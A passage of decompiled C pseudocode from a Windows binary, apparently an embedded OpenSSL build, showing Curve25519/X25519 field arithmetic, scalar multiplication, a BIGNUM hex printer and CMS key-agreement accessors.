  v32 = 2 * (v28 * v22 + v18 * v20 + v24 * v12 + v15 * 38 * v33 + *a2 * (__int64)*a2 + 38 * v3 * (__int64)v3);
  v9 = 2 * v3;
  v16 = 2 * *a2;
  v17 = v26;
  v27 = v10;
  v13 = 2 * (v15 * v18 + v2 * v20 + v9 * 38 * v33 + v17 * v16 + v10 * (__int64)v10 + 2 * v29 * v12);
  v34 = ((v32 + 0x2000000) >> 26) + 2 * (v12 * v18 + v9 * v22 + v17 * v20 + v10 * (__int64)(38 * v33) + v23 * v16);
  v11 = v29;
  v35 = ((v13 + 0x2000000) >> 26) + 2 * (v16 * v3 + v17 * v15 + 2 * v2 * v12 + v29 * (__int64)(38 * v33) + v25 * v24);
  v30 = ((v34 + 0x1000000) >> 25) + 2 * (v12 * v28 + 38 * v33 * v18 + v9 * v20 + v29 * v22 + v23 * v15 + v27 * v16);
  v31 = ((v35 + 0x1000000) >> 25)
      + 2 * (v9 * v15 + v17 * v24 + v25 * v18 + 2 * v2 * (__int64)(38 * v33) + v19 * v12 + v11 * v16);
  v21 = ((v30 + 0x2000000) >> 26) + 2 * (v9 * v12 + v17 * 38 * v33 + v27 * v15 + v11 * v20 + v25 * v16);
  v4 = ((v31 + 0x2000000) >> 26) + 2 * (v24 * v3 + v17 * v18 + v11 * v15 + v16 * v2 + v19 * (__int64)(38 * v33));
  v14 = ((v21 + 0x1000000) >> 25)
      - __PAIR64__((unsigned __int64)(v13 + 0x2000000) >> 32, (v13 + 0x2000000) & 0xFC000000)
      + v13;
  v5 = ((v4 + 0x1000000) >> 25)
     + 2 * (v9 * v18 + v11 * v24 + 2 * v2 * v15 + v17 * v17 + v19 * v16 + 38 * v33 * (__int64)v33);
  v6 = ((v5 + 0x2000000) >> 26) + 2 * (v28 * v3 + v2 * v24 + v11 * v18 + v19 * v15 + v16 * v33) + 0x1000000;
  v7 = 19 * (v6 >> 25)
     - __PAIR64__((unsigned __int64)(v32 + 0x2000000) >> 32, (v32 + 0x2000000) & 0xFC000000)
     + v32
     + 0x2000000;
  *a1 = 19 * (v6 >> 25) - ((v32 + 0x2000000) & 0xFC000000) + v32 - (v7 & 0xFC000000);
  a1[1] = v34 + (v7 >> 26) - ((v34 + 0x1000000) & 0xFE000000);
  a1[2] = v30 - ((v30 + 0x2000000) & 0xFC000000);
  a1[3] = v21 - ((v21 + 0x1000000) & 0xFE000000);
  a1[4] = v14 - ((v14 + 0x2000000) & 0xFC000000);
  a1[5] = v35 + ((__int64)(v14 + 0x2000000) >> 26) - ((v35 + 0x1000000) & 0xFE000000);
  a1[6] = v31 - ((v31 + 0x2000000) & 0xFC000000);
  result = ((v4 + 0x1000000) >> 25)
         + 2 * (v9 * v18 + v11 * v24 + 2 * v2 * v15 + v17 * v17 + v19 * v16 + 38 * v33 * v33)
         - ((v5 + 0x2000000) & 0xFC000000);
  a1[9] = ((v5 + 0x2000000) >> 26) + 2 * (v28 * v3 + v2 * v24 + v11 * v18 + v19 * v15 + v16 * v33) - (v6 & 0xFE000000);
  a1[7] = v4 - ((v4 + 0x1000000) & 0xFE000000);
  a1[8] = result;
  return result;
}

//----- (004767F0) --------------------------------------------------------
_DWORD *__cdecl sub_4767F0(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 0;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  a1[4] = 0;
  a1[5] = 0;
  a1[6] = 0;
  a1[7] = 0;
  a1[8] = 0;
  a1[9] = 0;
  a1[11] = 0;
  a1[12] = 0;
  a1[13] = 0;
  a1[14] = 0;
  a1[15] = 0;
  a1[16] = 0;
  a1[17] = 0;
  a1[18] = 0;
  a1[19] = 0;
  a1[10] = 1;
  a1[21] = 0;
  a1[22] = 0;
  a1[23] = 0;
  a1[24] = 0;
  a1[25] = 0;
  a1[26] = 0;
  a1[27] = 0;
  a1[28] = 0;
  a1[29] = 0;
  a1[20] = 1;
  a1[30] = 0;
  a1[31] = 0;
  a1[32] = 0;
  a1[33] = 0;
  a1[34] = 0;
  a1[35] = 0;
  a1[36] = 0;
  a1[37] = 0;
  a1[38] = 0;
  a1[39] = 0;
  return result;
}

//----- (00476890) --------------------------------------------------------
_DWORD *__cdecl sub_476890(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  a1[4] = 0;
  a1[5] = 0;
  a1[6] = 0;
  a1[7] = 0;
  a1[8] = 0;
  a1[9] = 0;
  *a1 = 1;
  a1[11] = 0;
  a1[12] = 0;
  a1[13] = 0;
  a1[14] = 0;
  a1[15] = 0;
  a1[16] = 0;
  a1[17] = 0;
  a1[18] = 0;
  a1[19] = 0;
  a1[10] = 1;
  a1[20] = 0;
  a1[21] = 0;
  a1[22] = 0;
  a1[23] = 0;
  a1[24] = 0;
  a1[25] = 0;
  a1[26] = 0;
  a1[27] = 0;
  a1[28] = 0;
  a1[29] = 0;
  return result;
}

//----- (00476900) --------------------------------------------------------
_DWORD *__usercall sub_476900@<eax>(_DWORD *a1@<edi>, int *a2)
{
  _DWORD *v3; // [esp-4h] [ebp-3Ch]
  _DWORD v4[10]; // [esp+10h] [ebp-28h] BYREF

  sub_474A00(v3, a2);
  sub_474A00(a1 + 20, a2 + 10);
  sub_475A00(a1 + 30, a2 + 20);
  sub_4733A0(a2, a1 + 10, a2 + 10);
  sub_474A00(v4, a1 + 10);
  sub_4733A0(a1 + 20, a1 + 10, a1);
  sub_473400(a1 + 20, a1 + 20, a1);
  sub_473400(v4, a1, a1 + 10);
  return sub_473400(a1 + 30, a1 + 30, a1 + 20);
}
// 476913: variable 'v3' is possibly undefined
// 476900: using guessed type _DWORD var_28[10];

//----- (00476990) --------------------------------------------------------
_DWORD *__usercall sub_476990@<eax>(_DWORD *a1@<ebx>, _DWORD *a2@<edi>, int *a3)
{
  _DWORD *v4; // [esp+0h] [ebp-38h]
  _DWORD v5[10]; // [esp+10h] [ebp-28h] BYREF

  sub_4733A0(a1 + 10, a2, v4);
  sub_473400(a1 + 10, a2 + 10, a1);
  sub_473460(a2 + 20, a3);
  sub_473460(a2 + 10, a3 + 10);
  sub_473460(a2 + 30, a1 + 30);
  sub_4733A0(a1 + 20, v5, a1 + 20);
  sub_473400(a2 + 20, a2, a2 + 10);
  sub_4733A0(a2 + 20, a2 + 10, a2 + 10);
  sub_4733A0(v5, a2 + 20, a2 + 30);
  return sub_473400(v5, a2 + 30, a2 + 30);
}
// 4769A4: variable 'v4' is possibly undefined
// 476990: using guessed type _DWORD var_28[10];

//----- (00476A40) --------------------------------------------------------
_DWORD *__usercall sub_476A40@<eax>(_DWORD *a1@<esi>, int a2, char a3)
{
  unsigned __int8 v3; // dl
  int v4; // edi
  bool v5; // al
  _DWORD *v6; // edi
  int v7; // ebp
  int v8; // ecx
  int v9; // eax
  int v10; // ebp
  int v11; // edx
  int v12; // ecx
  int v13; // edx
  int v14; // eax
  int v15; // ecx
  int v16; // edx
  int v17; // eax
  _DWORD *v19; // [esp+0h] [ebp-94h]
  _DWORD *v20; // [esp+10h] [ebp-84h]
  int v21; // [esp+10h] [ebp-84h]
  int v22; // [esp+10h] [ebp-84h]
  int v23; // [esp+10h] [ebp-84h]
  int v24; // [esp+10h] [ebp-84h]
  int v25; // [esp+10h] [ebp-84h]
  int v26; // [esp+10h] [ebp-84h]
  int v27; // [esp+14h] [ebp-80h]
  _DWORD v28[10]; // [esp+1Ch] [ebp-78h] BYREF
  _DWORD v29[10]; // [esp+44h] [ebp-50h] BYREF
  int v30[10]; // [esp+6Ch] [ebp-28h] BYREF

  sub_476890(v19);
  v4 = v3;
  v20 = (_DWORD *)((char *)&unk_519EC8 + 960 * a2);
  v27 = (v3 ^ 1) - 1 < 0;
  sub_475960(v27, v20, a1);
  sub_475960(v27, v20 + 10, a1 + 10);
  sub_475960(v27, v20 + 20, a1 + 20);
  v21 = (v4 ^ 2) - 1 < 0;
  sub_475960(v21, (_DWORD *)&unk_519F40 + 240 * a2, a1);
  sub_475960(v21, (_DWORD *)&unk_519F40 + 240 * a2 + 10, a1 + 10);
  sub_475960(v21, (_DWORD *)&unk_519F40 + 240 * a2 + 20, a1 + 20);
  v22 = (v4 ^ 3) - 1 < 0;
  sub_475960(v22, (_DWORD *)&unk_519FB8 + 240 * a2, a1);
  sub_475960(v22, (_DWORD *)&unk_519FB8 + 240 * a2 + 10, a1 + 10);
  sub_475960(v22, (_DWORD *)&unk_519FB8 + 240 * a2 + 20, a1 + 20);
  v23 = (v4 ^ 4) - 1 < 0;
  sub_475960(v23, (_DWORD *)&unk_51A030 + 240 * a2, a1);
  sub_475960(v23, (_DWORD *)&unk_51A030 + 240 * a2 + 10, a1 + 10);
  sub_475960(v23, (_DWORD *)&unk_51A030 + 240 * a2 + 20, a1 + 20);
  v24 = (v4 ^ 5) - 1 < 0;
  sub_475960(v24, (_DWORD *)&unk_51A0A8 + 240 * a2, a1);
  sub_475960(v24, (_DWORD *)&unk_51A0A8 + 240 * a2 + 10, a1 + 10);
  sub_475960(v24, (_DWORD *)&unk_51A0A8 + 240 * a2 + 20, a1 + 20);
  v25 = (v4 ^ 6) - 1 < 0;
  sub_475960(v25, (_DWORD *)&unk_51A120 + 240 * a2, a1);
  sub_475960(v25, (_DWORD *)&unk_51A120 + 240 * a2 + 10, a1 + 10);
  sub_475960(v25, (_DWORD *)&unk_51A120 + 240 * a2 + 20, a1 + 20);
  v26 = (v4 ^ 7) - 1 < 0;
  sub_475960(v26, (_DWORD *)&unk_51A198 + 240 * a2, a1);
  sub_475960(v26, (_DWORD *)&unk_51A198 + 240 * a2 + 10, a1 + 10);
  sub_475960(v26, (_DWORD *)&unk_51A198 + 240 * a2 + 20, a1 + 20);
  v5 = (v4 ^ 8) - 1 < 0;
  v6 = (_DWORD *)((char *)&unk_51A210 + 960 * a2);
  v7 = v5;
  sub_475960(v5, v6, a1);
  sub_475960(v7, v6 + 10, a1 + 10);
  sub_475960(v7, v6 + 20, a1 + 20);
  memcpy_0(v28, a1 + 10, sizeof(v28));
  memcpy_0(v29, a1, sizeof(v29));
  v8 = a1[22];
  v9 = a1[21];
  v10 = a3 < 0;
  v30[0] = -a1[20];
  v11 = -a1[23];
  v30[2] = -v8;
  v12 = a1[25];
  v30[3] = v11;
  v13 = a1[26];
  v30[1] = -v9;
  v14 = -a1[24];
  v30[5] = -v12;
  v15 = a1[28];
  v30[6] = -v13;
  v16 = a1[29];
  v30[4] = v14;
  v17 = -a1[27];
  v30[8] = -v15;
  v30[9] = -v16;
  v30[7] = v17;
  sub_475960(v10, v28, a1);
  sub_475960(v10, v29, a1 + 10);
  return sub_475960(v10, v30, a1 + 20);
}
// 476A69: variable 'v19' is possibly undefined
// 476A75: variable 'v3' is possibly undefined
// 476A40: using guessed type _DWORD var_78[10];
// 476A40: using guessed type _DWORD var_50[10];

//----- (00476D70) --------------------------------------------------------
int __fastcall sub_476D70(int a1, _DWORD *a2)
{
  int i; // eax
  char v5; // cl
  char v6; // al
  int j; // esi
  char v8; // al
  char v9; // cl
  char v10; // al
  char v11; // dl
  char v12; // al
  int k; // ebp
  int m; // ebp
  int result; // eax
  _DWORD v16[10]; // [esp+10h] [ebp-1D4h] BYREF
  int v17[10]; // [esp+38h] [ebp-1ACh] BYREF
  int v18[10]; // [esp+60h] [ebp-184h] BYREF
  int v19[10]; // [esp+88h] [ebp-15Ch] BYREF
  int v20[10]; // [esp+B0h] [ebp-134h] BYREF
  _DWORD v21[10]; // [esp+D8h] [ebp-10Ch] BYREF
  _DWORD v22[10]; // [esp+100h] [ebp-E4h] BYREF
  int v23[45]; // [esp+128h] [ebp-BCh] BYREF
  char v24; // [esp+1DFh] [ebp-5h]

  for ( i = 0; i < 32; ++i )
  {
    v5 = *(_BYTE *)(i + a1) >> 4;
    *((_BYTE *)&v23[30] + 2 * i) = *(_BYTE *)(i + a1) & 0xF;
    *((_BYTE *)&v23[30] + 2 * i + 1) = v5;
  }
  v6 = 0;
  for ( j = 0; j < 63; j += 3 )
  {
    *((_BYTE *)&v23[30] + j) += v6;
    v8 = (char)(*((_BYTE *)&v23[30] + j) + 8) >> 4;
    *((_BYTE *)&v23[30] + j + 1) += v8;
    v9 = v8;
    v10 = (char)(*((_BYTE *)&v23[30] + j + 1) + 8) >> 4;
    *((_BYTE *)&v23[30] + j + 2) += v10;
    v11 = v10;
    v12 = *((_BYTE *)&v23[30] + j + 2);
    *((_BYTE *)&v23[30] + j) -= 16 * v9;
    v6 = (char)(v12 + 8) >> 4;
    *((_BYTE *)&v23[30] + j + 1) -= 16 * v11;
    *((_BYTE *)&v23[30] + j + 2) -= 16 * v6;
  }
  v24 += v6;
  sub_4767F0(a2);
  for ( k = 1; k < 64; k += 2 )
  {
    sub_476A40(v23, (unsigned int)k >> 1, *((_BYTE *)&v23[30] + k));
    sub_476990(a2, v16, v23);
    sub_473460(a2, v19);
    sub_473460(a2 + 10, v18);
    sub_473460(a2 + 20, v19);
    sub_473460(a2 + 30, v17);
  }
  memcpy_0(v20, a2, sizeof(v20));
  memcpy_0(v21, a2 + 10, sizeof(v21));
  memcpy_0(v22, a2 + 20, sizeof(v22));
  sub_476900(v16, v20);
  sub_473460(v20, v19);
  sub_473460(v21, v18);
  sub_473460(v22, v19);
  sub_476900(v16, v20);
  sub_473460(v20, v19);
  sub_473460(v21, v18);
  sub_473460(v22, v19);
  sub_476900(v16, v20);
  sub_473460(v20, v19);
  sub_473460(v21, v18);
  sub_473460(v22, v19);
  sub_476900(v16, v20);
  sub_473460(a2, v19);
  sub_473460(a2 + 10, v18);
  sub_473460(a2 + 20, v19);
  sub_473460(a2 + 30, v17);
  for ( m = 0; m < 64; m += 2 )
  {
    sub_476A40(v23, (unsigned int)m >> 1, *((_BYTE *)&v23[30] + m));
    sub_476990(a2, v16, v23);
    sub_473460(a2, v19);
    sub_473460(a2 + 10, v18);
    sub_473460(a2 + 20, v19);
    result = sub_473460(a2 + 30, v17);
  }
  return result;
}
// 476D70: using guessed type _DWORD var_1D4[10];
// 476D70: using guessed type int var_15C[10];
// 476D70: using guessed type int var_184[10];
// 476D70: using guessed type int var_1AC[10];
// 476D70: using guessed type int var_134[10];
// 476D70: using guessed type _DWORD var_10C[10];
// 476D70: using guessed type _DWORD var_E4[10];

//----- (004770F0) --------------------------------------------------------
_DWORD *__fastcall sub_4770F0(_DWORD *a1, int a2, _DWORD *a3)
{
  _DWORD *result; // eax
  int v4; // edx
  int v5; // esi
  int v6; // edi
  int v7; // esi
  int v8; // edi
  int v9; // esi
  int v10; // edi
  int v11; // esi
  int v12; // edi
  int v13; // esi
  int v14; // edi
  int v15; // esi
  int v16; // edi
  int v17; // esi
  int v18; // edi
  int v19; // esi
  int v20; // edi
  int v21; // esi
  int v22; // edi
  int v23; // esi

  result = a3;
  v4 = -a2;
  v5 = v4 & (*a1 ^ *a3);
  *a1 ^= v5;
  *a3 ^= v5;
  v6 = a1[1];
  v7 = v4 & (v6 ^ a3[1]);
  a1[1] = v7 ^ v6;
  a3[1] ^= v7;
  v8 = a1[2];
  v9 = v4 & (v8 ^ a3[2]);
  a1[2] = v9 ^ v8;
  a3[2] ^= v9;
  v10 = a1[3];
  v11 = v4 & (v10 ^ a3[3]);
  a1[3] = v11 ^ v10;
  a3[3] ^= v11;
  v12 = a1[4];
  v13 = v4 & (v12 ^ a3[4]);
  a1[4] = v13 ^ v12;
  a3[4] ^= v13;
  v14 = a1[5];
  v15 = v4 & (v14 ^ a3[5]);
  a1[5] = v15 ^ v14;
  a3[5] ^= v15;
  v16 = a1[6];
  v17 = v4 & (v16 ^ a3[6]);
  a1[6] = v17 ^ v16;
  a3[6] ^= v17;
  v18 = a1[7];
  v19 = v4 & (v18 ^ a3[7]);
  a1[7] = v19 ^ v18;
  a3[7] ^= v19;
  v20 = a1[8];
  v21 = v4 & (v20 ^ a3[8]);
  a1[8] = v21 ^ v20;
  a3[8] ^= v21;
  v22 = a1[9];
  v23 = v4 & (v22 ^ a3[9]);
  a1[9] = v23 ^ v22;
  a3[9] ^= v23;
  return result;
}

//----- (004771B0) --------------------------------------------------------
int __usercall sub_4771B0@<eax>(int *a1@<ecx>, _DWORD *a2@<edi>)
{
  __int64 v2; // kr10_8
  __int64 v3; // kr18_8
  __int64 v4; // kr20_8
  int result; // eax
  __int64 v6; // [esp+2Ch] [ebp-68h]
  __int64 v7; // [esp+34h] [ebp-60h]
  __int64 v8; // [esp+3Ch] [ebp-58h]
  __int64 v9; // [esp+4Ch] [ebp-48h]
  __int64 v10; // [esp+64h] [ebp-30h]
  __int64 v11; // [esp+6Ch] [ebp-28h]
  int v12; // [esp+8Ch] [ebp-8h]

  v8 = 121666i64 * a1[1];
  v7 = 121666i64 * a1[3];
  v10 = 121666i64 * a1[5];
  v6 = 121666i64 * a1[7];
  v12 = 121666 * a1[9];
  v2 = 19 * ((121666i64 * a1[9] + 0x1000000) >> 25) + 121666i64 * *a1;
  v11 = ((v8 + 0x1000000) >> 25) + 121666i64 * a1[2];
  v9 = ((v7 + 0x1000000) >> 25) + 121666i64 * a1[4];
  v3 = ((v10 + 0x1000000) >> 25) + 121666i64 * a1[6];
  v4 = ((v6 + 0x1000000) >> 25) + 121666i64 * a1[8];
  *a2 = v2 - ((v2 + 0x2000000) & 0xFC000000);
  a2[1] = v8 + ((v2 + 0x2000000) >> 26) - ((v8 + 0x1000000) & 0xFE000000);
  a2[2] = v11 - ((v11 + 0x2000000) & 0xFC000000);
  a2[3] = v7 + ((v11 + 0x2000000) >> 26) - ((v7 + 0x1000000) & 0xFE000000);
  a2[4] = v9 - ((v9 + 0x2000000) & 0xFC000000);
  a2[5] = v10 + ((v9 + 0x2000000) >> 26) - ((v10 + 0x1000000) & 0xFE000000);
  a2[6] = v3 - ((v3 + 0x2000000) & 0xFC000000);
  a2[7] = v6 + ((v3 + 0x2000000) >> 26) - ((v6 + 0x1000000) & 0xFE000000);
  a2[8] = v4 - ((v4 + 0x2000000) & 0xFC000000);
  result = v12 + ((v4 + 0x2000000) >> 26) - ((v12 + 0x1000000) & 0xFE000000);
  a2[9] = result;
  return result;
}

//----- (00477550) --------------------------------------------------------
int __usercall sub_477550@<eax>(const void *a1@<edx>, int a2, unsigned __int8 *a3)
{
  int v3; // ebp
  int v4; // ecx
  int v5; // esi
  int v6; // ebp
  int v7; // ecx
  int v8; // edi
  int v9; // edi
  int v10; // edi
  int v11; // edi
  int v12; // edi
  int v13; // ebx
  _DWORD *v14; // ecx
  int v16; // [esp+10h] [ebp-144h] BYREF
  int v17; // [esp+14h] [ebp-140h]
  int v18; // [esp+18h] [ebp-13Ch]
  int v19; // [esp+1Ch] [ebp-138h]
  int v20; // [esp+20h] [ebp-134h]
  int v21; // [esp+24h] [ebp-130h]
  int v22; // [esp+28h] [ebp-12Ch]
  int v23; // [esp+2Ch] [ebp-128h]
  int v24; // [esp+30h] [ebp-124h]
  int v25; // [esp+34h] [ebp-120h]
  int v26; // [esp+38h] [ebp-11Ch] BYREF
  int v27; // [esp+3Ch] [ebp-118h]
  int v28; // [esp+40h] [ebp-114h]
  int v29; // [esp+44h] [ebp-110h]
  int v30; // [esp+48h] [ebp-10Ch]
  int v31; // [esp+4Ch] [ebp-108h]
  int v32; // [esp+50h] [ebp-104h]
  int v33; // [esp+54h] [ebp-100h]
  int v34; // [esp+58h] [ebp-FCh]
  int v35; // [esp+5Ch] [ebp-F8h]
  int v36; // [esp+60h] [ebp-F4h] BYREF
  int v37; // [esp+64h] [ebp-F0h]
  int v38; // [esp+68h] [ebp-ECh]
  int v39; // [esp+6Ch] [ebp-E8h]
  int v40; // [esp+70h] [ebp-E4h]
  int v41; // [esp+74h] [ebp-E0h]
  int v42; // [esp+78h] [ebp-DCh]
  int v43; // [esp+7Ch] [ebp-D8h]
  int v44; // [esp+80h] [ebp-D4h]
  int v45; // [esp+84h] [ebp-D0h]
  int v46; // [esp+88h] [ebp-CCh] BYREF
  int v47; // [esp+8Ch] [ebp-C8h]
  int v48; // [esp+90h] [ebp-C4h]
  int v49; // [esp+94h] [ebp-C0h]
  int v50; // [esp+98h] [ebp-BCh]
  int v51; // [esp+9Ch] [ebp-B8h]
  int v52; // [esp+A0h] [ebp-B4h]
  int v53; // [esp+A4h] [ebp-B0h]
  int v54; // [esp+A8h] [ebp-ACh]
  int v55; // [esp+ACh] [ebp-A8h]
  int v56; // [esp+B0h] [ebp-A4h] BYREF
  int v57; // [esp+B4h] [ebp-A0h]
  int v58; // [esp+B8h] [ebp-9Ch]
  int v59; // [esp+BCh] [ebp-98h]
  int v60; // [esp+C0h] [ebp-94h]
  int v61; // [esp+C4h] [ebp-90h]
  int v62; // [esp+C8h] [ebp-8Ch]
  int v63; // [esp+CCh] [ebp-88h]
  int v64; // [esp+D0h] [ebp-84h]
  int v65; // [esp+D4h] [ebp-80h]
  int v66; // [esp+D8h] [ebp-7Ch] BYREF
  int v67; // [esp+DCh] [ebp-78h]
  int v68; // [esp+E0h] [ebp-74h]
  int v69; // [esp+E4h] [ebp-70h]
  int v70; // [esp+E8h] [ebp-6Ch]
  int v71; // [esp+ECh] [ebp-68h]
  int v72; // [esp+F0h] [ebp-64h]
  int v73; // [esp+F4h] [ebp-60h]
  int v74; // [esp+F8h] [ebp-5Ch]
  int v75; // [esp+FCh] [ebp-58h]
  int i; // [esp+100h] [ebp-54h]
  int v77; // [esp+104h] [ebp-50h]
  _DWORD Src[10]; // [esp+108h] [ebp-4Ch] BYREF
  int v79[8]; // [esp+130h] [ebp-24h] BYREF

  qmemcpy(v79, a1, sizeof(v79));
  LOBYTE(v79[0]) &= 0xF8u;
  v77 = a2;
  HIBYTE(v79[7]) = HIBYTE(v79[7]) & 0x3F | 0x40;
  v3 = 0;
  sub_472C00(a3, Src);
  v37 = 0;
  v38 = 0;
  v39 = 0;
  v40 = 0;
  v41 = 0;
  v42 = 0;
  v43 = 0;
  v44 = 0;
  v45 = 0;
  v16 = 0;
  v17 = 0;
  v18 = 0;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  v22 = 0;
  v23 = 0;
  v24 = 0;
  v25 = 0;
  v36 = 1;
  memcpy_0(&v66, Src, 0x28u);
  v4 = 254;
  v27 = 0;
  v28 = 0;
  v29 = 0;
  v30 = 0;
  v31 = 0;
  v32 = 0;
  v33 = 0;
  v34 = 0;
  v35 = 0;
  v26 = 1;
  for ( i = 254; i >= 0; --i )
  {
    v5 = (*((unsigned __int8 *)v79 + v4 / 8) >> (v4 & 7)) & 1;
    v6 = v5 ^ v3;
    sub_4770F0(&v36, v6, &v66);
    sub_4770F0(&v16, v6, &v26);
    v46 = v66 - v26;
    v3 = v5;
    v47 = v67 - v27;
    v48 = v68 - v28;
    v49 = v69 - v29;
    v50 = v70 - v30;
    v51 = v71 - v31;
    v52 = v72 - v32;
    v53 = v73 - v33;
    v54 = v74 - v34;
    v55 = v75 - v35;
    v56 = v36 - v16;
    v57 = v37 - v17;
    v58 = v38 - v18;
    v59 = v39 - v19;
    v60 = v40 - v20;
    v61 = v41 - v21;
    v62 = v42 - v22;
    v63 = v43 - v23;
    v64 = v44 - v24;
    v65 = v45 - v25;
    v36 += v16;
    v37 += v17;
    v38 += v18;
    v39 += v19;
    v40 += v20;
    v16 = v26 + v66;
    v41 += v21;
    v17 = v27 + v67;
    v42 += v22;
    v18 = v28 + v68;
    v43 += v23;
    v19 = v29 + v69;
    v44 += v24;
    v20 = v30 + v70;
    v45 += v25;
    v21 = v31 + v71;
    v22 = v32 + v72;
    v23 = v33 + v73;
    v24 = v34 + v74;
    v25 = v35 + v75;
    sub_473460(&v26, &v36);
    sub_473460(&v16, &v56);
    sub_474A00(&v46, &v56);
    sub_474A00(&v56, &v36);
    v7 = v26 + v16;
    v16 = v26 - v16;
    v66 = v7;
    v67 = v27 + v17;
    v68 = v28 + v18;
    v8 = v29 + v19;
    v19 = v29 - v19;
    v69 = v8;
    v9 = v30 + v20;
    v20 = v30 - v20;
    v70 = v9;
    v10 = v31 + v21;
    v21 = v31 - v21;
    v71 = v10;
    v11 = v32 + v22;
    v22 = v32 - v22;
    v72 = v11;
    v12 = v33 + v23;
    v23 = v33 - v23;
    v73 = v12;
    v74 = v34 + v24;
    v24 = v34 - v24;
    v17 = v27 - v17;
    v75 = v35 + v25;
    v18 = v28 - v18;
    v25 = v35 - v25;
    sub_473460(&v36, &v46);
    v13 = v46;
    v56 -= v46;
    v57 -= v47;
    v58 -= v48;
    v60 -= v50;
    v61 -= v51;
    v59 -= v49;
    v63 -= v53;
    v64 -= v54;
    v62 -= v52;
    v65 -= v55;
    sub_474A00(&v16, &v16);
    sub_4771B0(&v56, &v26);
    sub_474A00(&v66, &v66);
    v47 += v27;
    v48 += v28;
    v50 += v30;
    v51 += v31;
    v49 += v29;
    v53 += v33;
    v54 += v34;
    v52 += v32;
    v55 += v35;
    v46 = v26 + v13;
    sub_473460(&v26, &v16);
    sub_473460(&v16, &v46);
    v4 = i - 1;
  }
  sub_4770F0(&v36, v5, &v66);
  sub_4770F0(&v16, v5, &v26);
  sub_4756E0(v14);
  sub_473460(&v36, &v16);
  return sub_473100(v77);
}
// 477C43: variable 'v14' is possibly undefined
// 477550: using guessed type _DWORD Src[10];

//----- (00477C90) --------------------------------------------------------
BOOL __cdecl sub_477C90(_BYTE *a1, const void *a2, unsigned __int8 *a3)
{
  sub_477550(a2, (int)a1, a3);
  return sub_413A50(byte_5216C8, a1, 32) != 0;
}

//----- (00477CC0) --------------------------------------------------------
int __cdecl sub_477CC0(int a1, const void *a2)
{
  _DWORD v3[40]; // [esp+3Ch] [ebp-F4h] BYREF
  int v4[10]; // [esp+DCh] [ebp-54h] BYREF
  int v5[10]; // [esp+104h] [ebp-2Ch] BYREF

  qmemcpy(v5, a2, 0x20u);
  LOBYTE(v5[0]) &= 0xF8u;
  HIBYTE(v5[7]) = HIBYTE(v5[7]) & 0x3F | 0x40;
  sub_476D70((int)v5, v3);
  v5[0] = v3[20] + v3[10];
  v5[1] = v3[21] + v3[11];
  v5[2] = v3[22] + v3[12];
  v5[3] = v3[23] + v3[13];
  v5[4] = v3[24] + v3[14];
  v5[5] = v3[15] + v3[25];
  v5[6] = v3[16] + v3[26];
  v5[7] = v3[17] + v3[27];
  v5[8] = v3[18] + v3[28];
  v5[9] = v3[29] + v3[19];
  sub_4756E0(v4);
  sub_473460(v5, v4);
  return sub_473100(a1);
}
// 477CC0: using guessed type int var_54[10];

//----- (00477ED0) --------------------------------------------------------
BOOL __cdecl sub_477ED0(int a1, int a2, unsigned int a3, int a4)
{
  unsigned int v4; // esi
  const char *v5; // eax

  v4 = 0;
  if ( !a3 )
    return sub_405110(a1, (int)"\n", 1) > 0;
  while ( v4 % 0xF || (!v4 || sub_4051D0(a1, (int)"\n") > 0) && sub_405340(a1, a4, 128) )
  {
    v5 = byte_4F1291;
    if ( v4 != a3 - 1 )
      v5 = word_4F1980;
    if ( sub_419190(a1, "%02x%s", *(unsigned __int8 *)(v4 + a2), v5) <= 0 )
      break;
    if ( ++v4 >= a3 )
      return sub_405110(a1, (int)"\n", 1) > 0;
  }
  return 0;
}

//----- (00477F80) --------------------------------------------------------
int __cdecl sub_477F80(int a1, const char *a2, _DWORD *Block, int a4, int a5)
{
  int result; // eax
  const char *v7; // ebp
  _DWORD *v8; // esi
  _DWORD *v9; // eax
  int v10; // edi
  _BYTE *v11; // eax
  int v12; // esi
  const char *v13; // eax
  int v14; // eax
  int v15; // [esp+4h] [ebp-4h]
  _BYTE *Blocka; // [esp+14h] [ebp+Ch]

  v15 = 0;
  if ( !Block )
    return 1;
  v7 = "-";
  if ( !sub_416E40((int)Block) )
    v7 = byte_4F1291;
  result = sub_405340(a1, a5, 128);
  if ( result )
  {
    if ( sub_416DB0((int)Block) )
    {
      return sub_419190(a1, "%s 0\n", a2) > 0;
    }
    else if ( (sub_416F90(Block) + 7) / 8 > 4 )
    {
      v10 = (sub_416F90(Block) + 7) / 8 + 1;
      v11 = sub_4133F0(v10);
      v12 = (int)v11;
      Blocka = v11;
      if ( v11 )
      {
        *v11 = 0;
        v13 = " (Negative)";
        if ( *v7 != 45 )
          v13 = byte_4F1291;
        if ( sub_419190(a1, "%s%s\n", a2, v13) > 0 )
        {
          v14 = sub_417300(Block, (char *)(v12 + 1));
          if ( *(char *)(v12 + 1) >= 0 )
            ++v12;
          else
            ++v14;
          if ( sub_477ED0(a1, v12, v14, a5 + 4) )
            v15 = 1;
        }
      }
      sub_4134B0(Blocka, v10);
      return v15;
    }
    else
    {
      v8 = (_DWORD *)sub_435D30((int)Block);
      v9 = (_DWORD *)sub_435D30((int)Block);
      return sub_419190(a1, "%s %s%lu (%s0x%lx)\n", a2, v7, *v9, v7, *v8) > 0;
    }
  }
  return result;
}

//----- (00478120) --------------------------------------------------------
int __cdecl sub_478120(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  if ( *a1 == 1 )
  {
    if ( a2 )
      *a2 = *(_DWORD *)(a1[1] + 12);
    if ( a3 )
      *a3 = *(_DWORD *)(a1[1] + 8);
    return 1;
  }
  else
  {
    sub_408310(46, 175, 181, (int)"crypto\\cms\\cms_kari.c", 28);
    return 0;
  }
}

//----- (00478170) --------------------------------------------------------
int __cdecl sub_478170(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6)
{
  int result; // eax
  int v7; // edi

  if ( *a1 != 1 )
  {
    sub_408310(46, 173, 181, (int)"crypto\\cms\\cms_kari.c", 61);
    return 0;
  }
  v7 = *(_DWORD *)(a1[1] + 4);
  if ( a5 )
    *a5 = 0;
  if ( a6 )
    *a6 = 0;
  if ( a4 )
    *a4 = 0;
  if ( a2 )
    *a2 = 0;
